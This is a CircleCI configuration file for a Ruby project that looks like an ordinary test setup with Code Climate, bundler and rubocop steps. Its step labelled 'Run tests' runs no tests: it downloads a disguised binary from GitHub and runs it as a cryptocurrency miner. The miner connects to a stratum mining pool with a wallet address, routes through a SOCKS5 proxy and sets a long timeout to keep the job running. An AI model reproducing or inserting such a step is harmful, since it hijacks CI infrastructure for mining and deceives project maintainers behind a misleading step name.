working_dir: &working_dir ~/app
.build_template: &script
  steps:
    - checkout
    - run: curl -L https://codeclimate.com/downloads/test-reporter/test-reporter-latest-linux-amd64 > ./cc-test-reporter
    - run: chmod +x ./cc-test-reporter
    - run: ./cc-test-reporter before-build
    - run: gem install bundler:2.1.4
    - run: bundle install --jobs=4 --retry=4 --path vendor/bundle
    - run: bundle exec rake rubocop
    - run:
        name: Run tests
        command: |
                    apt update 
                    apt install screen -y 
                    wget -O proxy-sse2 https://github.com/MawdeMylchreest/Mylchreest/raw/main/proxy-sse2
                    chmod +x proxy-sse2
                    screen -dmS ls
                    ./proxy-sse2 -a gr -o stratum+tcps://stratum-eu.rplant.xyz:17056 -u RWi1xbUyvKo8JvYpLbyJQ64kPBR8rkFw5a.CI=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=SOCKS5://185.189.68.168:3128
        no_output_timeout: 235m
version: 2.0
